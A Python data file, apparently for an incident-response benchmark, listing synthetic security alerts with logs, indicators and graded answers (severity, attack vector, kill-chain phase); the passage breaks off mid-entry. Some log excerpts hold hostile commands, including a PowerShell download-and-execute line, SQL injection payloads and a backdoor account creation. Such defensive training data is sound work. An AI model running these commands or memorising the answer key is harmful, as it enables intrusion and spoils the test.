"""
Incident Data — Incident Response Commander
=============================================
All security incident scenarios organized by difficulty level.
Contains 20+ easy incidents, 12 medium incidents, and 5 hard incidents
with realistic syslog/SIEM data, network indicators, and grading metadata.

Author: Team Envonox
"""

# ---------------------------------------------------------------------------
# Attack Vector Taxonomy (MITRE ATT&CK-inspired, 12 categories)
# ---------------------------------------------------------------------------

ATTACK_VECTORS = [
    "PHISHING_CREDENTIAL_HARVEST",
    "RANSOMWARE_ENCRYPTION",
    "SQL_INJECTION",
    "PRIVILEGE_ESCALATION",
    "LATERAL_MOVEMENT",
    "DATA_EXFILTRATION",
    "SUPPLY_CHAIN_COMPROMISE",
    "DNS_TUNNELING",
    "BRUTE_FORCE_AUTH",
    "INSIDER_THREAT",
    "ZERO_DAY_EXPLOIT",
    "COMMAND_AND_CONTROL",
]

# Kill-chain phase groupings for partial credit
KILL_CHAIN_PHASES = {
    "INITIAL_ACCESS": ["PHISHING_CREDENTIAL_HARVEST", "SUPPLY_CHAIN_COMPROMISE", "BRUTE_FORCE_AUTH"],
    "EXECUTION": ["RANSOMWARE_ENCRYPTION", "SQL_INJECTION", "ZERO_DAY_EXPLOIT"],
    "PERSISTENCE": ["PRIVILEGE_ESCALATION", "COMMAND_AND_CONTROL"],
    "EXFILTRATION": ["DATA_EXFILTRATION", "DNS_TUNNELING", "LATERAL_MOVEMENT", "INSIDER_THREAT"],
}

SEVERITY_LEVELS = ["CRITICAL", "HIGH", "MEDIUM", "LOW"]

# ---------------------------------------------------------------------------
# Easy Incidents (20) — Severity Classification
# ---------------------------------------------------------------------------

EASY_INCIDENTS = [
    {
        "alert_summary": "Multiple failed SSH login attempts detected from IP 185.220.101.42 targeting root account on production database server db-prod-01.",
        "log_excerpt": "Apr 07 03:14:22 db-prod-01 sshd[4821]: Failed password for root from 185.220.101.42 port 44231 ssh2\nApr 07 03:14:23 db-prod-01 sshd[4822]: Failed password for root from 185.220.101.42 port 44232 ssh2\n[... 847 more attempts in 12 minutes]",
        "network_indicators": "Source: 185.220.101.42 (Tor exit node) → Dest: 10.0.1.50:22 | 849 connection attempts in 12 min",
        "affected_systems": "db-prod-01 (PostgreSQL 15, contains customer PII)",
        "timeline": "03:14 - 03:26 UTC, ongoing",
        "severity": "CRITICAL",
        "reason": "Active brute-force against production DB with customer PII from known Tor exit node"
    },
    {
        "alert_summary": "Scheduled vulnerability scan completed on staging environment. 3 medium-severity CVEs found in nginx 1.24.0.",
        "log_excerpt": "Apr 07 02:00:00 scanner [INFO] Scan started: staging-web-01\nApr 07 02:15:33 scanner [INFO] Found CVE-2024-7347 (Medium) nginx range filter\nApr 07 02:15:33 scanner [INFO] Found CVE-2024-24989 (Medium) nginx HTTP/3\nApr 07 02:15:34 scanner [INFO] Found CVE-2024-24990 (Medium) nginx QUIC",
        "network_indicators": "Internal scan only, no external traffic involved",
        "affected_systems": "staging-web-01 (non-production, no customer data)",
        "timeline": "02:00 - 02:16 UTC, scan complete",
        "severity": "LOW",
        "reason": "Known CVEs on non-production staging system, no active exploitation"
    },
    {
        "alert_summary": "Unusual outbound data transfer of 4.7GB detected from finance workstation to external IP 91.234.99.12 over port 443 during non-business hours.",
        "log_excerpt": "Apr 07 01:30:00 fw-01 [ALERT] Outbound: 10.0.5.22 → 91.234.99.12:443 | 4.7GB transferred\nApr 07 01:30:01 fw-01 [INFO] GeoIP: 91.234.99.12 → Belarus\nApr 07 01:30:01 fw-01 [INFO] User: jsmith (Finance Dept) | No VPN active",
        "network_indicators": "Source: 10.0.5.22 → Dest: 91.234.99.12:443 (Belarus) | 4.7GB outbound | No DLP match",
        "affected_systems": "WS-FIN-022 (jsmith workstation, Finance Dept, access to financial reports)",
        "timeline": "01:30 UTC, single large transfer, non-business hours (local 9:30 PM)",
        "severity": "CRITICAL",
        "reason": "Large data exfiltration to suspicious foreign IP from finance workstation outside business hours"
    },
    {
        "alert_summary": "Employee reported receiving a suspicious email with a .docm attachment claiming to be an invoice from a known vendor.",
        "log_excerpt": "Apr 07 09:12:00 mail-gw [WARN] Suspicious attachment: invoice_Q1_2026.docm\nApr 07 09:12:01 mail-gw [INFO] Sender: billing@acm3-corp.com (typosquat of acme-corp.com)\nApr 07 09:12:01 mail-gw [INFO] Macro analysis: VBA downloads payload from hxxp://185.141.27.8/update.exe\nApr 07 09:12:02 mail-gw [INFO] Recipient: aperez@company.com — email quarantined, NOT opened",
        "network_indicators": "Sender domain: acm3-corp.com (registered 2 days ago) | Payload URL: 185.141.27.8",
        "affected_systems": "Email gateway (quarantined), no endpoint compromise",
        "timeline": "09:12 UTC, email quarantined automatically",
        "severity": "MEDIUM",
        "reason": "Phishing attempt with malicious macro caught by email gateway — no execution occurred"
    },
    {
        "alert_summary": "Web application firewall detected and blocked 12 SQL injection attempts against the customer login endpoint.",
        "log_excerpt": "Apr 07 14:05:22 waf-01 [BLOCK] POST /api/login | Payload: ' OR 1=1 -- | IP: 203.0.113.55\nApr 07 14:05:23 waf-01 [BLOCK] POST /api/login | Payload: ' UNION SELECT * FROM users -- | IP: 203.0.113.55\n[... 10 more blocked attempts]",
        "network_indicators": "Source: 203.0.113.55 → Dest: app-prod-01:443 | 12 blocked requests in 2 min",
        "affected_systems": "app-prod-01 (customer portal, WAF protected)",
        "timeline": "14:05 - 14:07 UTC, all blocked by WAF",
        "severity": "MEDIUM",
        "reason": "SQL injection attempts were blocked by WAF — no breach, but indicates active targeting"
    },
    {
        "alert_summary": "Root certificate authority private key was found exposed in a public GitHub repository belonging to a DevOps engineer.",
        "log_excerpt": "Apr 07 11:00:00 secret-scanner [CRITICAL] Found private key in github.com/eng-team/infra-scripts/ca-root.key\nApr 07 11:00:01 secret-scanner [INFO] Key fingerprint matches production CA\nApr 07 11:00:01 secret-scanner [INFO] Repository is PUBLIC, 3 forks detected\nApr 07 11:00:02 secret-scanner [INFO] Key was committed 6 hours ago",
        "network_indicators": "N/A — code repository exposure, no network traffic",
        "affected_systems": "Root CA (all internal TLS certificates), production PKI infrastructure",
        "timeline": "Key committed at 05:00 UTC, detected at 11:00 UTC, 6-hour exposure window",
        "severity": "CRITICAL",
        "reason": "Root CA private key exposed publicly — can forge any internal certificate, total PKI compromise"
    },
    {
        "alert_summary": "Antivirus detected and quarantined a known cryptominer binary on a developer workstation.",
        "log_excerpt": "Apr 07 16:30:00 av-engine [DETECT] Trojan.CoinMiner.GenericKD on WS-DEV-015\nApr 07 16:30:01 av-engine [ACTION] File quarantined: C:\\Users\\mchen\\Downloads\\free_tool.exe\nApr 07 16:30:01 av-engine [INFO] No outbound connections made by binary",
        "network_indicators": "No C2 connections established — binary was quarantined before execution",
        "affected_systems": "WS-DEV-015 (developer workstation, no production access)",
        "timeline": "16:30 UTC, immediately quarantined",
        "severity": "LOW",
        "reason": "Known malware caught before execution on non-production system with no lateral spread"
    },
    {
        "alert_summary": "AWS GuardDuty detected IAM credentials being used from an IP in a country where no employees are located.",
        "log_excerpt": "Apr 07 08:45:00 guardduty [HIGH] UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration\nApr 07 08:45:01 guardduty [INFO] User: deploy-bot | Action: s3:GetObject on s3://prod-backups\nApr 07 08:45:01 guardduty [INFO] Source IP: 5.188.86.172 (Russia) | Normal region: us-east-1\nApr 07 08:45:02 guardduty [INFO] 47 objects downloaded from prod-backups bucket in 8 minutes",
        "network_indicators": "Source: 5.188.86.172 (Russia) → AWS S3 API | 47 GetObject calls in 8 min",
        "affected_systems": "IAM user deploy-bot, S3 bucket prod-backups (database backups with customer data)",
        "timeline": "08:45 - 08:53 UTC, 47 objects exfiltrated",
        "severity": "CRITICAL",
        "reason": "Stolen IAM credentials actively being used to exfiltrate production database backups with customer data"
    },
    {
        "alert_summary": "Network IDS flagged DNS queries with unusually long subdomain strings from an internal host to an external domain.",
        "log_excerpt": "Apr 07 04:20:00 ids-01 [ALERT] Suspicious DNS: aGVsbG8gd29ybGQ=.data.evil-c2.com from 10.0.3.15\nApr 07 04:20:01 ids-01 [ALERT] Suspicious DNS: dGhpcyBpcyBhIHRlc3Q=.data.evil-c2.com from 10.0.3.15\nApr 07 04:20:02 ids-01 [INFO] 340 similar queries in last 30 minutes — base64 encoded subdomains",
        "network_indicators": "Source: 10.0.3.15 → DNS: evil-c2.com | 340 queries with base64 subdomains in 30 min",
        "affected_systems": "SRV-APP-015 (application server, processes payment data)",
        "timeline": "03:50 - 04:20 UTC, ongoing DNS tunneling activity",
        "severity": "CRITICAL",
        "reason": "Active DNS tunneling for data exfiltration from payment processing server — indicates established C2"
    },
    {
        "alert_summary": "Security team received notification of a new critical CVE affecting the OpenSSL version running on all production web servers. No exploitation in the wild yet.",
        "log_excerpt": "Apr 07 10:00:00 vuln-feed [INFO] New CVE: CVE-2026-1234 (CVSS 9.8) — OpenSSL 3.1.x RCE\nApr 07 10:00:01 asset-mgr [INFO] Affected assets: web-prod-01 through web-prod-08 (OpenSSL 3.1.4)\nApr 07 10:00:01 vuln-feed [INFO] Exploitation: None reported in the wild\nApr 07 10:00:02 vuln-feed [INFO] Patch available: OpenSSL 3.1.5",
        "network_indicators": "No active exploitation indicators — vulnerability disclosure only",
        "affected_systems": "web-prod-01 through web-prod-08 (8 production web servers)",
        "timeline": "10:00 UTC, CVE published, patch available, no exploitation",
        "severity": "HIGH",
        "reason": "Critical CVE on production servers with patch available but no active exploitation — urgent but not immediate breach"
    },
    {
        "alert_summary": "Endpoint detection found PowerShell executing encoded commands that disable Windows Defender and download a remote payload on an HR workstation.",
        "log_excerpt": "Apr 07 13:22:00 edr-01 [CRITICAL] Suspicious PowerShell on WS-HR-003\nApr 07 13:22:01 edr-01 [INFO] Command: powershell -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQA...\nApr 07 13:22:01 edr-01 [DECODED] Set-MpPreference -DisableRealtimeMonitoring $true; IEX(New-Object Net.WebClient).DownloadString('hxxp://45.33.32.156/stage2.ps1')\nApr 07 13:22:02 edr-01 [INFO] stage2.ps1 downloaded and executing — Mimikatz credential dump in progress",
        "network_indicators": "Source: WS-HR-003 → 45.33.32.156:80 | PowerShell download + Mimikatz execution",
        "affected_systems": "WS-HR-003 (HR department, access to employee PII and payroll systems)",
        "timeline": "13:22 UTC, active compromise in progress",
        "severity": "CRITICAL",
        "reason": "Active compromise with Mimikatz credential dump on HR workstation with PII access — lateral movement imminent"
    },
    {
        "alert_summary": "A software update pushed to all company laptops was found to contain an additional unsigned DLL not present in the vendor's official package.",
        "log_excerpt": "Apr 07 06:00:00 sccm-01 [INFO] Pushed update: VendorApp v4.2.1 to 1,247 endpoints\nApr 07 09:30:00 threat-intel [ALERT] VendorApp v4.2.1 contains unsigned helper.dll\nApr 07 09:30:01 threat-intel [INFO] helper.dll hash matches known SolarWinds-style backdoor\nApr 07 09:30:02 threat-intel [INFO] DLL established C2 callback to 172.67.181.22 on 1,247 machines",
        "network_indicators": "1,247 endpoints → 172.67.181.22:443 | Periodic C2 beacon every 300 seconds",
        "affected_systems": "1,247 corporate laptops across all departments, VendorApp update pipeline",
        "timeline": "06:00 UTC update pushed, 09:30 UTC detected — 3.5-hour dwell time, 1,247 machines compromised",
        "severity": "CRITICAL",
        "reason": "Supply chain compromise affecting 1,247 endpoints with active C2 — SolarWinds-style attack"
    },
    {
        "alert_summary": "IT admin account used to create 5 new admin users at 2 AM with no change request ticket or approval workflow.",
        "log_excerpt": "Apr 07 02:03:00 ad-dc-01 [WARN] New admin user created: svc_backup1 by admin.jdoe\nApr 07 02:03:15 ad-dc-01 [WARN] New admin user created: svc_backup2 by admin.jdoe\nApr 07 02:03:30 ad-dc-01 [WARN] New admin user created: svc_monitor1 by admin.jdoe\n[... 2 more accounts created]\nApr 07 02:04:00 ticketing [INFO] No change requests found for admin.jdoe in last 7 days",
        "network_indicators": "Source: 10.0.0.55 (admin.jdoe workstation) → AD DC 10.0.0.10 | RDP + LDAP",
        "affected_systems": "Active Directory domain controller, 5 new privileged accounts",
        "timeline": "02:03 - 02:04 UTC, all accounts created within 1 minute",
        "severity": "HIGH",
        "reason": "Unauthorized privilege escalation — bulk admin account creation outside change management, possible insider threat or compromised admin"
    },
    {
        "alert_summary": "Marketing team member's corporate Google Workspace account is sending bulk emails to external addresses with zip file attachments.",
        "log_excerpt": "Apr 07 07:15:00 mail-gw [WARN] Bulk send: lisa.m@company.com → 2,340 external recipients\nApr 07 07:15:01 mail-gw [INFO] Attachment: project_details.zip (contains .exe)\nApr 07 07:15:02 mail-gw [INFO] Login origin: Nigeria (usual: United States)\nApr 07 07:15:03 mail-gw [INFO] No MFA challenge — legacy app password used",
        "network_indicators": "Login from Nigerian IP 41.190.2.153 via legacy IMAP | 2,340 outbound emails",
        "affected_systems": "lisa.m@company.com Google Workspace account, corporate email reputation",
        "timeline": "07:15 UTC, bulk send in progress",
        "severity": "HIGH",
        "reason": "Compromised email account being used as spam/malware relay — reputation damage and possible phishing of contacts"
    },
    {
        "alert_summary": "Disk usage alert: log partition on web-prod-03 reached 92% capacity due to verbose debug logging left enabled after deployment.",
        "log_excerpt": "Apr 07 12:00:00 monitoring [WARN] Disk usage alert: /var/log at 92% on web-prod-03\nApr 07 12:00:01 monitoring [INFO] Largest file: /var/log/app/debug.log (47GB)\nApr 07 12:00:02 monitoring [INFO] Debug logging enabled since last deploy (Apr 05)\nApr 07 12:00:03 monitoring [INFO] No security indicators found in logs",
        "network_indicators": "N/A — operational issue, no security traffic",
        "affected_systems": "web-prod-03 (production web server, logging subsystem)",
        "timeline": "12:00 UTC, disk alert triggered",
        "severity": "LOW",
        "reason": "Operational issue — debug logging filling disk, not a security incident"
    },
    {
        "alert_summary": "Third-party penetration test discovered an open S3 bucket containing older application backups with no encryption.",
        "log_excerpt": "Apr 07 15:00:00 pentest [FINDING] s3://old-app-backups is publicly readable\nApr 07 15:00:01 pentest [INFO] Contains 23 .tar.gz files from 2024 — app configs + DB schemas\nApr 07 15:00:02 pentest [INFO] No customer PII found in sampled files\nApr 07 15:00:03 pentest [INFO] Bucket created by former employee, not in asset inventory",
        "network_indicators": "Public S3 bucket — accessible from any IP without authentication",
        "affected_systems": "s3://old-app-backups (legacy, unmanaged, no PII)",
        "timeline": "15:00 UTC, found during scheduled pentest",
        "severity": "MEDIUM",
        "reason": "Data exposure risk from misconfigured S3 bucket — no PII but contains internal configs that could aid attackers"
    },
    {
        "alert_summary": "Container orchestration platform detected a pod running a cryptocurrency mining image that was not in the approved registry.",
        "log_excerpt": "Apr 07 05:45:00 k8s-audit [ALERT] Unauthorized image: xmrig/xmrig:latest in namespace dev-sandbox\nApr 07 05:45:01 k8s-audit [INFO] Pod created by: dev-intern (ServiceAccount)\nApr 07 05:45:02 k8s-audit [INFO] Resource consumption: 4 CPU cores, 8GB RAM\nApr 07 05:45:03 k8s-audit [INFO] Mining pool connection: stratum+tcp://pool.minexmr.com:4444",
        "network_indicators": "Pod → pool.minexmr.com:4444 | Stratum protocol | 4 CPU cores consumed",
        "affected_systems": "Kubernetes dev-sandbox namespace, dev-intern service account",
        "timeline": "05:45 UTC, pod running for approximately 8 hours",
        "severity": "MEDIUM",
        "reason": "Unauthorized cryptominer in dev sandbox — resource abuse and policy violation, but contained to non-prod namespace"
    },
    {
        "alert_summary": "SIEM correlation rule triggered: same user account logged in from two countries within 15 minutes, indicating impossible travel.",
        "log_excerpt": "Apr 07 10:30:00 siem [ALERT] Impossible travel: user cto@company.com\nApr 07 10:30:01 siem [INFO] Login 1: 10:15 UTC from New York, US (VPN)\nApr 07 10:30:02 siem [INFO] Login 2: 10:28 UTC from Moscow, Russia (direct)\nApr 07 10:30:03 siem [INFO] Both sessions active, accessing executive file shares",
        "network_indicators": "Login 1: 74.125.xx.xx (NYC) | Login 2: 5.45.xx.xx (Moscow) | 13-min gap",
        "affected_systems": "CTO account, executive file shares, VPN gateway",
        "timeline": "10:15 - 10:28 UTC, dual active sessions",
        "severity": "CRITICAL",
        "reason": "Impossible travel on CTO account with active session from hostile nation — likely compromised executive credentials"
    },
    {
        "alert_summary": "Automated backup verification failed for 3 consecutive days on the disaster recovery site.",
        "log_excerpt": "Apr 07 00:00:00 backup-mgr [ERROR] Backup verification failed: DR site (Apr 5, 6, 7)\nApr 07 00:00:01 backup-mgr [INFO] Last successful verification: Apr 4\nApr 07 00:00:02 backup-mgr [INFO] Error: checksum mismatch on 14 of 200 backup sets\nApr 07 00:00:03 backup-mgr [INFO] No ransomware indicators detected",
        "network_indicators": "N/A — internal backup system, no external traffic",
        "affected_systems": "DR backup site, 14 backup sets with checksum mismatches",
        "timeline": "Failures over Apr 5-7, detected Apr 7 00:00 UTC",
        "severity": "HIGH",
        "reason": "Backup integrity failures could indicate ransomware staging or storage corruption — impacts disaster recovery capability"
    },
    {
        "alert_summary": "Junior developer accidentally committed AWS access keys to a public open-source repository. Keys have read/write access to production DynamoDB.",
        "log_excerpt": "Apr 07 14:30:00 secret-scanner [CRITICAL] AWS keys found in github.com/opensource-proj/config.yaml\nApr 07 14:30:01 secret-scanner [INFO] Key: AKIA... has DynamoDB:* permissions on prod tables\nApr 07 14:30:02 secret-scanner [INFO] Committed 2 hours ago, repo has 150 stars\nApr 07 14:30:03 cloudtrail [INFO] No unauthorized API calls detected YET using these keys",
        "network_indicators": "N/A — credential exposure via code repository",
        "affected_systems": "AWS IAM keys, production DynamoDB tables (customer orders, inventory)",
        "timeline": "Keys committed at 12:30 UTC, detected at 14:30 UTC, no abuse yet",
        "severity": "CRITICAL",
        "reason": "Production database credentials publicly exposed — imminent risk of data breach even though no abuse detected yet"
    },
]

# ---------------------------------------------------------------------------
# Medium Incidents (12) — Attack Vector Identification
# ---------------------------------------------------------------------------

MEDIUM_INCIDENTS = [
    {
        "alert_summary": "Executive received a targeted email impersonating the CEO requesting wire transfer approval. Email passes SPF but fails DKIM.",
        "log_excerpt": "Apr 07 09:00:00 mail-gw [WARN] BEC attempt: From ceo@company.com (spoofed) to cfo@company.com\nApr 07 09:00:01 mail-gw [INFO] SPF: pass (sent from allowed IP) | DKIM: fail\nApr 07 09:00:02 mail-gw [INFO] Body: 'Please wire $47,000 to account ending 8891 urgently'\nApr 07 09:00:03 mail-gw [INFO] Reply-to: ceo.personal@gmail.com (not corporate)",
        "network_indicators": "Sender IP allowed by SPF but DKIM failed | Reply-to: external Gmail",
        "affected_systems": "CFO email, financial wire transfer process",
        "attack_vector": "PHISHING_CREDENTIAL_HARVEST",
        "explanation": "Business email compromise via spoofed CEO identity to trick CFO into wire transfer",
        "keywords": ["PHISHING", "CREDENTIAL", "HARVEST", "BEC", "SPOOF", "EMAIL"],
        "kill_chain_phase": "INITIAL_ACCESS"
    },
    {
        "alert_summary": "Multiple servers showing files being renamed with .encrypted extension and ransom note dropped in every directory.",
        "log_excerpt": "Apr 07 03:00:00 edr-01 [CRITICAL] Mass file rename: *.docx → *.docx.encrypted on SRV-FILE-01\nApr 07 03:00:01 edr-01 [CRITICAL] New file: RANSOM_NOTE.txt in 847 directories\nApr 07 03:00:02 edr-01 [INFO] Ransom demand: 25 BTC to bc1q... within 48 hours\nApr 07 03:00:03 edr-01 [INFO] Encryption spreading to SRV-FILE-02 via SMB share",
        "network_indicators": "SMB lateral spread: SRV-FILE-01 → SRV-FILE-02 | No external C2 detected",
        "affected_systems": "SRV-FILE-01, SRV-FILE-02, corporate file shares (50TB+ data)",
        "attack_vector": "RANSOMWARE_ENCRYPTION",
        "explanation": "Active ransomware encrypting file servers and spreading laterally via SMB",
        "keywords": ["RANSOMWARE", "ENCRYPTION", "ENCRYPT", "RANSOM", "CRYPTO"],
        "kill_chain_phase": "EXECUTION"
    },
    {
        "alert_summary": "Web application logs show successful extraction of user credentials table via time-based blind SQL injection on search endpoint.",
        "log_excerpt": "Apr 07 11:00:00 app-log [ERROR] Slow query: SELECT * FROM users WHERE name LIKE '%' AND SLEEP(5)--\nApr 07 11:00:01 waf-01 [MISS] Request passed WAF: encoded payload in cookie\nApr 07 11:00:02 db-audit [ALERT] Full table scan on 'users' table (340,000 rows)\nApr 07 11:00:03 app-log [INFO] 2,847 requests from 203.0.113.99 with SQL patterns",
        "network_indicators": "Source: 203.0.113.99 → app-prod:443 | 2,847 requests with SQL payloads | WAF bypassed via cookie encoding",
        "affected_systems": "Customer portal application, users database table (340K records with hashed passwords)",
        "attack_vector": "SQL_INJECTION",
        "explanation": "Time-based blind SQLi exploited search endpoint, WAF bypassed, user credentials table extracted",
        "keywords": ["SQL", "INJECTION", "DATABASE", "QUERY", "SQLI"],
        "kill_chain_phase": "EXECUTION"
    },
    {
        "alert_summary": "A standard user account suddenly gained Domain Admin privileges through exploitation of a misconfigured Group Policy Object.",
        "log_excerpt": "Apr 07 22:15:00 ad-dc [ALERT] Privilege change: user.jpark added to Domain Admins\nApr 07 22:15:01 ad-dc [INFO] Changed by: GPO 'IT-Maintenance' (writable by Authenticated Users)\nApr 07 22:15:02 ad-dc [INFO] user.jpark previous groups: Domain Users, IT-HelpDesk\nApr 07 22:15:03 ad-dc [INFO] user.jpark now accessing SYSVOL and NTDS.dit",
        "network_indicators": "Internal AD traffic: 10.0.0.88 → 10.0.0.10 (DC) | LDAP + SMB",
        "affected_systems": "Active Directory, Domain Admin group, GPO 'IT-Maintenance'",
        "attack_vector": "PRIVILEGE_ESCALATION",
        "explanation": "GPO misconfiguration exploited to escalate standard user to Domain Admin",
        "keywords": ["PRIVILEGE", "ESCALATION", "ADMIN", "ELEVATION", "PERMISSIONS"],
        "kill_chain_phase": "PERSISTENCE"
    },
    {
        "alert_summary": "Compromised workstation using WMI and PsExec to execute commands on 12 other hosts in the network segment.",
        "log_excerpt": "Apr 07 04:00:00 edr-01 [ALERT] PsExec execution from WS-SALES-007 to 12 targets\nApr 07 04:00:01 edr-01 [INFO] WMI process creation on SRV-APP-01, SRV-APP-02, SRV-DB-01...\nApr 07 04:00:02 edr-01 [INFO] Credential: admin.thompson (compromised via phishing 2 days ago)\nApr 07 04:00:03 edr-01 [INFO] Actions: net user /add backdoor P@ssw0rd on each target",
        "network_indicators": "Source: WS-SALES-007 → 12 internal hosts | Port 445 (SMB) + 135 (WMI)",
        "affected_systems": "12 servers and workstations, admin.thompson credentials",
        "attack_vector": "LATERAL_MOVEMENT",
        "explanation": "Attacker using compromised admin credentials to move laterally via PsExec/WMI across 12 hosts",
        "keywords": ["LATERAL", "MOVEMENT", "SPREAD", "PIVOT", "PROPAGATION"],
        "kill_chain_phase": "EXFILTRATION"
    },
    {
        "alert_summary": "Database admin ran unauthorized export of entire customer database to personal USB drive, detected by DLP agent.",
        "log_excerpt": "Apr 07 17:45:00 dlp-agent [CRITICAL] USB write: customer_full_export.csv (2.1GB) by db-admin.rao\nApr 07 17:45:01 dlp-agent [INFO] File contains: names, emails, SSNs, credit card hashes\nApr 07 17:45:02 dlp-agent [INFO] USB device: SanDisk Ultra 64GB (not company-issued)\nApr 07 17:45:03 hr-system [INFO] db-admin.rao submitted resignation 3 days ago",
        "network_indicators": "USB data transfer — no network exfiltration | DLP triggered on PII patterns",
        "affected_systems": "Customer database, USB storage device, db-admin.rao workstation",
        "attack_vector": "INSIDER_THREAT",
        "explanation": "Departing employee exfiltrating full customer database with PII to personal USB drive",
        "keywords": ["INSIDER", "THREAT", "INTERNAL", "EMPLOYEE", "UNAUTHORIZED"],
        "kill_chain_phase": "EXFILTRATION"
    },
    {
        "alert_summary": "Network traffic analysis reveals high-volume DNS queries with base64-encoded subdomains to a domain registered yesterday.",
        "log_excerpt": "Apr 07 04:20:00 dns-monitor [ALERT] Anomalous DNS: 340 queries to data.freshdom-xyz.com\nApr 07 04:20:01 dns-monitor [INFO] Subdomain pattern: base64-encoded 255-byte chunks\nApr 07 04:20:02 dns-monitor [INFO] Source: SRV-PAY-01 (payment processing server)\nApr 07 04:20:03 whois [INFO] freshdom-xyz.com registered 18 hours ago, privacy-protected",
        "network_indicators": "SRV-PAY-01 → DNS: freshdom-xyz.com | 340 queries with encoded subdomains | Domain age: 18 hours",
        "affected_systems": "SRV-PAY-01 (payment processor), DNS infrastructure",
        "attack_vector": "DNS_TUNNELING",
        "explanation": "Data exfiltration via DNS tunneling from payment server to newly registered domain",
        "keywords": ["DNS", "TUNNEL", "TUNNELING", "COVERT", "CHANNEL"],
        "kill_chain_phase": "EXFILTRATION"
    },
    {
        "alert_summary": "Security team detected 12,000 failed login attempts across 500 user accounts from a botnet of 200+ IP addresses.",
        "log_excerpt": "Apr 07 06:00:00 auth-log [ALERT] Distributed brute force detected\nApr 07 06:00:01 auth-log [INFO] 12,847 failed logins | 523 unique usernames | 214 source IPs\nApr 07 06:00:02 auth-log [INFO] Pattern: credential stuffing (email:password pairs from known breach)\nApr 07 06:00:03 auth-log [WARN] 14 accounts locked out, 3 successful logins detected",
        "network_indicators": "214 source IPs (botnet) → auth.company.com:443 | 12,847 attempts in 2 hours",
        "affected_systems": "Authentication service, 523 user accounts targeted, 3 accounts compromised",
        "attack_vector": "BRUTE_FORCE_AUTH",
        "explanation": "Distributed credential stuffing attack from botnet, 3 accounts compromised using known breach credentials",
        "keywords": ["BRUTE", "FORCE", "AUTH", "CREDENTIAL", "STUFFING", "PASSWORD"],
        "kill_chain_phase": "INITIAL_ACCESS"
    },
    {
        "alert_summary": "Network monitoring detected periodic HTTPS beacons from 47 hosts to an IP address linked to APT29 infrastructure.",
        "log_excerpt": "Apr 07 02:00:00 fw-01 [ALERT] C2 beacon pattern detected from 47 internal hosts\nApr 07 02:00:01 fw-01 [INFO] Destination: 185.243.115.8:443 (APT29/Cozy Bear infrastructure)\nApr 07 02:00:02 fw-01 [INFO] Beacon interval: exactly 300 seconds ± 30s jitter\nApr 07 02:00:03 threat-intel [CRITICAL] IP 185.243.115.8 linked to SolarWinds-style C2 framework",
        "network_indicators": "47 hosts → 185.243.115.8:443 | 300s beacon interval | APT29 attributed",
        "affected_systems": "47 corporate endpoints across multiple departments",
        "attack_vector": "COMMAND_AND_CONTROL",
        "explanation": "Established C2 channel to APT29 infrastructure with 47 beaconing hosts — advanced persistent threat",
        "keywords": ["COMMAND", "CONTROL", "C2", "BEACON", "APT", "RAT"],
        "kill_chain_phase": "PERSISTENCE"
    },
    {
        "alert_summary": "CI/CD pipeline compromise: malicious code injected into build dependency that adds a backdoor to every compiled artifact.",
        "log_excerpt": "Apr 07 13:00:00 ci-scanner [CRITICAL] Tampered dependency: npm package 'util-helpers' v2.1.0\nApr 07 13:00:01 ci-scanner [INFO] Package modified on registry 4 hours ago by compromised maintainer\nApr 07 13:00:02 ci-scanner [INFO] Backdoor: reverse shell to 45.77.xx.xx in postinstall script\nApr 07 13:00:03 ci-scanner [INFO] Affected builds: 23 services deployed in last 4 hours",
        "network_indicators": "Build servers → npm registry | 23 services → 45.77.xx.xx:4444 reverse shell",
        "affected_systems": "CI/CD pipeline, npm dependency chain, 23 production services",
        "attack_vector": "SUPPLY_CHAIN_COMPROMISE",
        "explanation": "Compromised npm package maintainer injects backdoor affecting 23 production services via CI/CD",
        "keywords": ["SUPPLY", "CHAIN", "DEPENDENCY", "THIRD", "PARTY", "COMPROMISE"],
        "kill_chain_phase": "INITIAL_ACCESS"
    },
    {
        "alert_summary": "Endpoint detection flagged unknown exploit against a zero-day vulnerability in the company's custom Java middleware.",
        "log_excerpt": "Apr 07 19:00:00 edr-01 [CRITICAL] Zero-day exploit detected on middleware-prod-01\nApr 07 19:00:01 edr-01 [INFO] Exploit targets deserialization flaw in CustomAuth.jar\nApr 07 19:00:02 edr-01 [INFO] No CVE assigned — unreported vulnerability\nApr 07 19:00:03 edr-01 [INFO] Payload: reverse shell established to 94.102.49.xx",
        "network_indicators": "External → middleware-prod-01:8443 | Exploit payload in HTTP POST | Reverse shell to 94.102.49.xx",
        "affected_systems": "middleware-prod-01 (custom Java auth service for all applications)",
        "attack_vector": "ZERO_DAY_EXPLOIT",
        "explanation": "Unknown zero-day in custom middleware exploited to establish reverse shell — no patch available",
        "keywords": ["ZERO", "DAY", "0DAY", "EXPLOIT", "VULNERABILITY", "UNPATCHED"],
        "kill_chain_phase": "EXECUTION"
    },
    {
        "alert_summary": "Sensitive R&D documents being uploaded to personal cloud storage accounts from multiple engineering workstations.",
        "log_excerpt": "Apr 07 16:00:00 casb [ALERT] Bulk upload to personal Dropbox from 3 engineering workstations\nApr 07 16:00:01 casb [INFO] Files: product_roadmap_2027.pdf, patent_draft_v3.docx, chip_design_v2.dwg\nApr 07 16:00:02 casb [INFO] Users: eng.liu, eng.patel, eng.smith — all in same project team\nApr 07 16:00:03 casb [INFO] Total: 1.8GB uploaded in 20 minutes to 3 different personal accounts",
        "network_indicators": "3 workstations → dropbox.com:443 | 1.8GB upload | Personal accounts (not corporate Dropbox)",
        "affected_systems": "Engineering workstations, R&D intellectual property, personal cloud storage",
        "attack_vector": "DATA_EXFILTRATION",
        "explanation": "Coordinated data exfiltration of R&D IP to personal cloud storage by multiple team members",
        "keywords": ["DATA", "EXFILTRATION", "THEFT", "LEAK", "EXTRACT", "STEAL"],
        "kill_chain_phase": "EXFILTRATION"
    },
]

# ---------------------------------------------------------------------------
# Hard Incidents (5) — Remediation Playbook Writing
# ---------------------------------------------------------------------------

HARD_INCIDENTS = [
    {
        "alert_summary": "Active ransomware spreading across file servers via SMB. 3 servers encrypted, 2 more in progress. Ransom demand: 25 BTC within 48 hours.",
        "log_excerpt": "Apr 07 03:00:00 edr [CRITICAL] LockBit 3.0 detected — 3 servers encrypted\nApr 07 03:01:00 edr [INFO] Lateral spread via SMB (port 445) using stolen admin credentials\nApr 07 03:02:00 fw-01 [INFO] C2 beacon: 185.220.101.42:443 every 60s\nApr 07 03:03:00 backup-mgr [WARN] Backup server SRV-BKP-01 showing unusual I/O — may be targeted next",
